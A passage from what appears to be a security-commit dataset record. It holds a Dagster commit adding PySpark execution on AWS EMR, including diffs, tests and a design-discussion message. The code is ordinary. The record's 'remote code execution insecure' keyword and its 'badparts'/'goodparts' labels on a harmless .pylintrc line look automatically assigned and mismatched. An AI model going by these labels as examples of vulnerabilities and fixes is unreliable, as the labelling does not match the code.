@abc.abstractmethod\n+    def get_compute_fn(self, fn, solid_name):\n+        pass\n+\n+\n+class SystemPySparkResource(PySparkResourceDefinition):\n+    def get_compute_fn(self, fn, solid_name):\n+        return fn\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def pyspark_resource(init_context):\n+    pyspark = SystemPySparkResource(init_context.resource_config['spark_conf'])\n+    try:\n+        yield pyspark\n+    finally:\n+        pyspark.stop()\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def spark_session_resource(init_context):\n+    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n+    try:\n+        yield spark\n+    finally:\n+        spark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py\nnew file mode 100644\nindex 0000000000..e69de29bb2\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\nnew file mode 100644\nindex 0000000000..8c8ba519b0\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\n@@ -0,0 +1,67 @@\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+\n+\n+def test_simple_pyspark_decorator():\n+    @pyspark_solid\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\n+\n+\n+def test_named_pyspark_decorator():\n+    @pyspark_solid(name='blah', description='foo bar', config={'foo': Field(str)})\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(\n+        pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'baz'}}}},\n+        run_config=RunConfig(mode='default'),\n+    ).success\n+\n+\n+def test_default_pyspark_decorator():\n+    @pyspark_solid(pyspark_resource_key='first_pyspark')\n+    def first_pyspark_job(context):\n+        list_p = [('Michelle', 19), ('Austin', 29), ('Lydia', 35)]\n+        rdd = context.resources.first_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pyspark_solid(pyspark_resource_key='last_pyspark')\n+    def last_pyspark_job(context):\n+        list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+        rdd = context.resources.last_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pipeline(\n+        mode_defs=[\n+            ModeDefinition(\n+                'default',\n+                resource_defs={'first_pyspark': pyspark_resource, 'last_pyspark': pyspark_resource},\n+            )\n+        ]\n+    )\n+    def pipe():\n+        first_pyspark_job()\n+        last_pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\ndiff --git a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\nindex 9562480ae1..f08e55ab8c 100644\n--- a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n+++ b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n@@ -17,7 +17,8 @@ def _flatten_dict(d, result, key_path=None):\n                 result.append(('.'.join(new_key_path), v))\n \n     result = []\n-    _flatten_dict(d, result)\n+    if d is not None:\n+        _flatten_dict(d, result)\n     return result\n \n \n@@ -28,6 +29,10 @@ def parse_spark_config(spark_conf):\n     '''\n \n     spark_conf_list = flatten_dict(spark_conf)\n+    return format_for_cli(spark_conf_list)\n+\n+\n+def format_for_cli(spark_conf_list):\n     return list(\n         itertools.chain.from_iterable([('--conf', '{}={}'.format(*c)) for c in spark_conf_list])\n     )\n","files":{"\/.pylintrc":{"changes":[{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]},{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]}],"source":"\n[MESSAGES CONTROL] disable=C,R,duplicate-code,W0511,W1201,W1202,no-init [TYPECHECK] ignored-classes=responses signature-mutators=solid,composite_solid,lambda_solid [MASTER] ignore=snapshots ","sourceWithComments":"[MESSAGES CONTROL]\n\n# Enable the message, report, category or checker with the given id(s). You can\n# either give multiple identifier separated by comma (,) or put this option\n# multiple time.\n#enable=\n\n# Disable the message, report, category or checker with the given id(s). You\n# can either give multiple identifier separated by comma (,) or put this option\n# multiple time (only on the command line, not in the configuration file where\n# it should appear only once).#\n#\n# R - refactoring related checks\n# C - convention related checks\n# W0511 disable TODO warning\n# W1201, W1202 disable log format warning. False positives (I think)\n\ndisable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n\n# See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n[TYPECHECK]\nignored-classes=responses\nsignature-mutators=solid,composite_solid,lambda_solid\n\n[MASTER]\nignore=snapshots"}},"msg":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349"}},"https:\/\/github.com\/shanku007\/pro-orch":{"1e02665ca7b2d58f178a499e0ab7b8056a4bab52":{"url":"https:\/\/api.github.com\/repos\/shanku007\/pro-orch\/commits\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","html_url":"https:\/\/github.com\/shanku007\/pro-orch\/commit\/1e02665ca7b2d58f178a499e0ab7b8056a4bab52","message":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain healthy SSH tunnels (I've been down this route, it's a pain). Moreover, it would require configuring the local installations as in (1).\n3. Give up on the tight dagster <> pyspark integration, and just have separate orchestration and compute\u2014this is the norm today in Airflow, where you'd have a Pyspark operator that `subprocess.Popens` a `spark-submit my-pyspark-code.py`, and `my-pyspark-code.py` is a Python file that lives separately from the orchestration Python. EMR APIs effectively work the same, see an example here https:\/\/stackoverflow.com\/a\/37117296\/11295366.\n4. Structure Pyspark solids so that they execute differently on different Spark targets. Locally, we can just assume we can grab a `SparkSession` and go; for submitting the work to EMR, we should wrap execution of the solid into a separate Python file and submit ourselves as a workload to the EMR APIs. EMR expects (1) a main Python file, and (2) a zip archive of associated Python code you'd like to distribute to the Spark workers in the cluster. The EMR APIs will then effectively shell out to `spark-submit` locally on the EMR master, where the Spark installation is configured, such that instantiating a `SparkSession` will work fine.\n\n**Notes**\nThis diff implements a version of (4) above; tracking follow-up issues:\n\n~~1. The overriding of compute behavior based on where we're executing feels janky, and it feels like there's a weird mix of mode\/resource\/compute override going on here.~~\n~~2. The zip archive bundling seems prone to issues\/fragile; I'm building a zip of the Python code I find in the current directory and shipping it to S3; I worry that the `from ... import ...` to gain access to the invoking pipeline will be easy to get wrong.~~ -> will eventually support making this pluggable\n3. There's no guarantee we're going to be able to communicate back to the invoking Dagster instance on the host that kicked off the EMR job, rehydrate resources properly, or generally play nice with the rest of Dagster at all. Ideally we should probably assume we can't, and just use the EMR APIs in the invoking Dagster parent process to read back any metadata from the task execution via the EMR APIs.\n~~4. This bundles setting up the environment and execution into one step, which should be broken apart.~~\n~~5. Need to catch mode mismatches per Alex's comment~~ -> no longer an issue given the switch to resource-based implementation\n\nTest Plan: manual\n\nReviewers: alangenfeld, max, schrockn\n\nReviewed By: schrockn\n\nSubscribers: schrockn, themissinghlink, alangenfeld, max, sashank\n\nDifferential Revision: https:\/\/dagster.phacility.com\/D1349","sha":"1e02665ca7b2d58f178a499e0ab7b8056a4bab52","keyword":"remote code execution insecure","diff":"diff --git a\/.pylintrc b\/.pylintrc\nindex 5fb38167cd..b82f31e2cc 100644\n--- a\/.pylintrc\n+++ b\/.pylintrc\n@@ -20,7 +20,7 @@ disable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\nindex d03147cbed..9f8b39bc6d 100644\n--- a\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n+++ b\/python_modules\/libraries\/dagster-aws\/MANIFEST.in\n@@ -1,3 +1,5 @@\n recursive-include dagster_aws *.sh\n recursive-include dagster_aws *.yaml\n+recursive-include dagster_aws *.txt\n+recursive-include dagster_aws *.template\n include LICENSE\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\nnew file mode 100644\nindex 0000000000..81d5243677\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\n@@ -0,0 +1,21 @@\n+import sys\n+\n+from pyspark import SparkFiles\n+from pyspark.sql import SparkSession\n+\n+spark = SparkSession.builder.getOrCreate()\n+sc = spark.sparkContext\n+sys.path.insert(0, SparkFiles.getRootDirectory())\n+\n+from dagster import RunConfig\n+from dagster.utils.test import execute_solid_within_pipeline\n+\n+from {pipeline_file} import {pipeline_fn_name}\n+\n+if __name__ == '__main__':\n+    execute_solid_within_pipeline(\n+        {pipeline_fn_name},\n+        '{solid_name}',\n+        environment_dict={environment_dict},\n+        run_config=RunConfig(mode='{mode_name}'),\n+    )\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\nnew file mode 100644\nindex 0000000000..5da9fe2ec7\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\n@@ -0,0 +1,237 @@\n+import os\n+\n+import boto3\n+import six\n+from botocore.exceptions import WaiterError\n+from dagster_pyspark import PySparkResourceDefinition\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict, format_for_cli\n+\n+from dagster import Field, check, resource\n+from dagster.core.errors import DagsterInvalidDefinitionError\n+from dagster.seven import get_system_temp_directory\n+\n+from .utils import build_main_file, build_pyspark_zip, get_install_requirements_step\n+\n+# On EMR, Spark is installed here\n+EMR_SPARK_HOME = '\/usr\/lib\/spark\/'\n+\n+\n+class EMRPySparkResource(PySparkResourceDefinition):\n+    def __init__(self, config):\n+        self.config = config\n+        self.emr_client = boto3.client('emr', region_name=self.config['region_name'])\n+        self.s3_client = boto3.client('s3', region_name=self.config['region_name'])\n+\n+        # Construct the SparkSession\n+        super(EMRPySparkResource, self).__init__(self.config.get('spark_conf'))\n+\n+    def get_compute_fn(self, fn, solid_name):\n+        '''Construct new compute function for EMR pyspark execution. In the scenario where we are\n+        running on a Dagster box, we will (1) sync the client code to an S3 staging bucket, and then\n+        (2) invoke execution via the EMR APIs.\n+\n+        On EMR, we'll just return the original solid function body to kick off normal pyspark\n+        execution. Since that will be launched on the EMR master node with YARN, it will\n+        automatically use the EMR cluster for execution.\n+        '''\n+\n+        if self.running_on_emr:\n+            return fn\n+\n+        def new_compute_fn(context):\n+            self._sync_code_to_s3(context, solid_name)\n+            step_defs = self._get_execute_steps(context, solid_name)\n+            steps = self.add_job_flow_steps(step_defs)\n+            self.wait_for_steps(context, steps['StepIds'])\n+\n+        return new_compute_fn\n+\n+    def _sync_code_to_s3(self, context, solid_name):\n+        '''Synchronize the pyspark code to an S3 staging bucket for use on EMR. Note that\n+        requirements are installed separately when a requirements.txt is provided.\n+\n+        For the zip file, consider the following toy example:\n+\n+        # Folder: my_pyspark_project\/\n+        # a.py\n+        def foo():\n+            print(1)\n+\n+        # b.py\n+        def bar():\n+            print(2)\n+\n+        # main.py\n+        from a import foo\n+        from b import bar\n+\n+        foo()\n+        bar()\n+\n+        This will zip up `my_pyspark_project\/` as `my_pyspark_project.zip`. Then, when running\n+        `spark-submit --py-files my_pyspark_project.zip main.py` on EMR this will print 1, 2.\n+\n+        Note that we also dynamically construct main.py to support targeting execution of a single\n+        solid on EMR vs. the entire pipeline.\n+        '''\n+        run_id = context.run_id\n+        main_file = os.path.join(get_system_temp_directory(), '%s-main.py' % run_id)\n+        zip_file = os.path.join(get_system_temp_directory(), '%s-pyspark.zip' % run_id)\n+\n+        try:\n+            build_main_file(\n+                main_file,\n+                mode_name=context.pipeline_run.mode,\n+                pipeline_file=self.config['pipeline_file'],\n+                solid_name=solid_name,\n+                environment_dict=context.environment_dict,\n+                pipeline_fn_name=self.config['pipeline_fn_name'],\n+            )\n+\n+            build_pyspark_zip(\n+                zip_file=zip_file,\n+                path=os.path.dirname(os.path.abspath(self.config['pipeline_file'])),\n+            )\n+\n+            self.s3_client.upload_file(\n+                zip_file, self.config['staging_bucket'], run_id + '\/pyspark.zip'\n+            )\n+            self.s3_client.upload_file(\n+                main_file, self.config['staging_bucket'], run_id + '\/main.py'\n+            )\n+\n+        finally:\n+            if os.path.exists(main_file):\n+                os.unlink(main_file)\n+            if os.path.exists(zip_file):\n+                os.unlink(zip_file)\n+\n+    def _get_execute_steps(self, context, solid_name):\n+        '''From the local Dagster instance, construct EMR steps that will kick off execution on a\n+        remote EMR cluster.\n+        '''\n+        action_on_failure = self.config['action_on_failure']\n+        staging_bucket = self.config['staging_bucket']\n+\n+        run_id = context.run_id\n+        local_root = os.path.dirname(os.path.abspath(self.config['pipeline_file']))\n+\n+        steps = []\n+\n+        # Install Python dependencies if a requirements file exists\n+        requirements_file = self.config.get('requirements_file_path')\n+        if requirements_file and not os.path.exists(requirements_file):\n+            raise DagsterInvalidDefinitionError(\n+                'The requirements.txt file that was specified does not exist'\n+            )\n+\n+        if not requirements_file:\n+            requirements_file = os.path.join(local_root, 'requirements.txt')\n+\n+        if os.path.exists(requirements_file):\n+            with open(requirements_file, 'rb') as f:\n+                python_dependencies = six.ensure_str(f.read()).split('\\n')\n+                steps.append(get_install_requirements_step(python_dependencies, action_on_failure))\n+\n+        # Execute Solid via spark-submit\n+        conf = dict(flatten_dict(self.config.get('spark_conf')))\n+        conf['spark.app.name'] = conf.get('spark.app.name', solid_name)\n+\n+        check.invariant(\n+            conf.get('spark.master', 'yarn') == 'yarn',\n+            desc='spark.master is configured as %s; cannot set Spark master on EMR to anything '\n+            'other than \"yarn\"' % conf.get('spark.master'),\n+        )\n+\n+        steps.append(\n+            {\n+                'Name': 'Execute Solid %s' % solid_name,\n+                'ActionOnFailure': action_on_failure,\n+                'HadoopJarStep': {\n+                    'Jar': 'command-runner.jar',\n+                    'Args': [\n+                        EMR_SPARK_HOME + 'bin\/spark-submit',\n+                        '--master',\n+                        'yarn',\n+                        '--deploy-mode',\n+                        conf.get('spark.submit.deployMode', 'client'),\n+                    ]\n+                    + format_for_cli(list(flatten_dict(conf)))\n+                    + [\n+                        '--py-files',\n+                        's3:\/\/%s\/%s\/pyspark.zip' % (staging_bucket, run_id),\n+                        's3:\/\/%s\/%s\/main.py' % (staging_bucket, run_id),\n+                    ],\n+                },\n+            }\n+        )\n+        return steps\n+\n+    def add_job_flow_steps(self, step_defs):\n+        '''Submit the constructed job flow steps to EMR for execution.\n+        '''\n+        return self.emr_client.add_job_flow_steps(\n+            JobFlowId=self.config['job_flow_id'], Steps=step_defs\n+        )\n+\n+    def wait_for_steps(self, context, step_ids):\n+        '''Uses the boto3 waiter to wait for job flow step completion.\n+        '''\n+        waiter = self.emr_client.get_waiter('step_complete')\n+\n+        try:\n+            context.log.info(\n+                'Waiting for steps: '\n+                + str(\n+                    self.emr_client.list_steps(\n+                        ClusterId=self.config['job_flow_id'], StepIds=step_ids\n+                    )\n+                )\n+            )\n+            for step_id in step_ids:\n+                waiter.wait(\n+                    ClusterId=self.config['job_flow_id'],\n+                    StepId=step_id,\n+                    WaiterConfig={'Delay': 5, 'MaxAttempts': 100},\n+                )\n+        except WaiterError:\n+            context.log.warning('Timed out waiting for EMR steps to finish')\n+\n+    @property\n+    def running_on_emr(self):\n+        '''Detects whether we are running on the EMR cluster\n+        '''\n+        if os.path.exists('\/mnt\/var\/lib\/info\/job-flow.json'):\n+            return True\n+        return False\n+\n+\n+@resource(\n+    {\n+        'pipeline_file': Field(str, description='Path to the file where the pipeline is defined'),\n+        'pipeline_fn_name': Field(str),\n+        'spark_config': spark_config(),\n+        'job_flow_id': Field(str, description='Name of the job flow (cluster) on which to execute'),\n+        'region_name': Field(str),\n+        'action_on_failure': Field(str, is_optional=True, default_value='CANCEL_AND_WAIT'),\n+        'staging_bucket': Field(\n+            str,\n+            is_optional=False,\n+            description='S3 staging bucket to use for staging the produced main.py and zip file of'\n+            ' Python code',\n+        ),\n+        'requirements_file_path': Field(\n+            str,\n+            is_optional=True,\n+            description='Path to a requirements.txt file; the current directory is searched if none'\n+            ' is specified.',\n+        ),\n+    }\n+)\n+def emr_pyspark_resource(init_context):\n+    emr_pyspark = EMRPySparkResource(init_context.resource_config)\n+    try:\n+        yield emr_pyspark\n+    finally:\n+        emr_pyspark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\nnew file mode 100644\nindex 0000000000..b6267f9caf\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\n@@ -0,0 +1,63 @@\n+import copy\n+import os\n+import zipfile\n+\n+import six\n+\n+from dagster.utils import script_relative_path\n+\n+\n+def subset_environment_dict(environment_dict, solid_name):\n+    subset = copy.deepcopy(environment_dict)\n+    if 'solids' in subset:\n+        solid_config_keys = list(subset['solids'].keys())\n+        for key in solid_config_keys:\n+            if key != solid_name:\n+                del subset['solids'][key]\n+    return subset\n+\n+\n+def build_main_file(\n+    main_file, mode_name, pipeline_file, solid_name, environment_dict, pipeline_fn_name\n+):\n+    with open(script_relative_path('main.py.template'), 'rb') as f:\n+        main_template_str = six.ensure_str(f.read())\n+\n+    with open(main_file, 'wb') as f:\n+        f.write(\n+            six.ensure_binary(\n+                main_template_str.format(\n+                    mode_name=mode_name,\n+                    pipeline_file=os.path.splitext(os.path.basename(pipeline_file))[0],\n+                    solid_name=solid_name,\n+                    environment_dict=subset_environment_dict(environment_dict, solid_name),\n+                    pipeline_fn_name=pipeline_fn_name,\n+                )\n+            )\n+        )\n+\n+\n+def build_pyspark_zip(zip_file, path):\n+    '''Archives the current path into a file named `zip_file`\n+    '''\n+    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:\n+        for root, _, files in os.walk(path):\n+            for fname in files:\n+                abs_fname = os.path.join(root, fname)\n+\n+                # Skip various artifacts\n+                if 'pytest' in abs_fname or '__pycache__' in abs_fname or 'pyc' in abs_fname:\n+                    continue\n+\n+                zf.write(abs_fname, os.path.relpath(os.path.join(root, fname), path))\n+\n+\n+def get_install_requirements_step(python_dependencies, action_on_failure, python_binary='python3'):\n+    return {\n+        'Name': 'Install Dependencies',\n+        'ActionOnFailure': action_on_failure,\n+        'HadoopJarStep': {\n+            'Jar': 'command-runner.jar',\n+            'Args': ['sudo', python_binary, '-m', 'pip', 'install'] + python_dependencies,\n+        },\n+    }\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\nnew file mode 100644\nindex 0000000000..f53d93ce79\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\n@@ -0,0 +1,8 @@\n+boto3\n+dagster\n+dagit\n+dagster_aws\n+dagster_pyspark\n+dagster_spark\n+moto\n+pytest\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\nnew file mode 100644\nindex 0000000000..2505b1f5d0\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\n@@ -0,0 +1,116 @@\n+import os\n+\n+import boto3\n+import pytest\n+from dagster_aws.emr.resources import emr_pyspark_resource\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+from moto import mock_emr\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+from dagster.seven import mock\n+\n+\n+@pyspark_solid\n+def example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pyspark_solid(\n+    name='blah', description='this is a test', config={'foo': Field(str), 'bar': Field(int)}\n+)\n+def other_example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pipeline(\n+    mode_defs=[\n+        ModeDefinition('prod', resource_defs={'pyspark': emr_pyspark_resource}),\n+        ModeDefinition('local', resource_defs={'pyspark': pyspark_resource}),\n+    ]\n+)\n+def example_pipe():\n+    example_solid()\n+    other_example_solid()\n+\n+\n+def test_local():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},},\n+        run_config=RunConfig(mode='local'),\n+    )\n+    assert result.success\n+\n+\n+@mock_emr\n+@mock.patch('dagster_aws.emr.resources.EMRPySparkResource.wait_for_steps')\n+def test_pyspark_emr(mock_wait):\n+    client = boto3.client('emr', region_name='us-west-1')\n+\n+    run_job_flow_args = dict(\n+        Instances={\n+            'InstanceCount': 1,\n+            'KeepJobFlowAliveWhenNoSteps': True,\n+            'MasterInstanceType': 'c3.medium',\n+            'Placement': {'AvailabilityZone': 'us-west-1a'},\n+            'SlaveInstanceType': 'c3.xlarge',\n+        },\n+        JobFlowRole='EMR_EC2_DefaultRole',\n+        LogUri='s3:\/\/mybucket\/log',\n+        Name='cluster',\n+        ServiceRole='EMR_DefaultRole',\n+        VisibleToAllUsers=True,\n+    )\n+\n+    job_flow_id = client.run_job_flow(**run_job_flow_args)['JobFlowId']\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': job_flow_id,\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\n+    assert mock_wait.called_once\n+\n+\n+@pytest.mark.skip\n+def test_do_it_live_emr():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': os.environ.get('AWS_EMR_JOB_FLOW_ID'),\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    